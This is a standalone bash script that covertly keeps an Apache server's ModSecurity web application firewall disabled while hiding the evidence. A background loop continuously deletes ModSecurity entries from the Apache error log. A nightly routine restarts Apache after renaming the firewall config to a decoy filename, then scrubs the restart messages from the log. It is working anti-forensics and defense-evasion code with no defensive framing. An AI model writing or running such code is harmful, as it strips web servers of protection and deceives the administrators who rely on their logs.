#!/bin/bash

export LC_ALL=C

LOG_FILE="/var/log/apache2/error.log"
MODSEC_BASE="/etc/modsecurity/modsecurity.conf"
MODSEC_TEMP="/etc/modsecurity/modsecuritybL6qM.conf"

[ -f "$LOG_FILE" ] && sed -i '/ModSecurity/d' "$LOG_FILE"

(
  while inotifywait -e modify "$LOG_FILE" 2>/dev/null; do
    sed -i '/ModSecurity/d' "$LOG_FILE"
  done
) &

while true; do
  CURRENT_TIME=$(date +"%H:%M")

  if [ "$CURRENT_TIME" == "00:05" ]; then
    TIME_PATTERN=$(date +"%a %b %d %H:%M")

    [ -f "$MODSEC_TEMP" ] && mv -f "$MODSEC_TEMP" "$MODSEC_BASE"
    
    sudo systemctl restart apache2

    [ -f "$MODSEC_BASE" ] && mv -f "$MODSEC_BASE" "$MODSEC_TEMP"

    sleep 2
    
    sed -i "/$TIME_PATTERN.*\(Apache\/2\|mpm_\|configured\|resuming\|SIG\|Command line\|Server built\|mod_security\|APR\|OpenSSL\|ssl:warn\|AH01906\|AH01909\|PCRE2\|LUA\|YAJL\|LIBXML\|Status engine\)/d" "$LOG_FILE"

    sed -i '/^\s*$/d' "$LOG_FILE"

    sleep 61
  fi

  sleep 30
done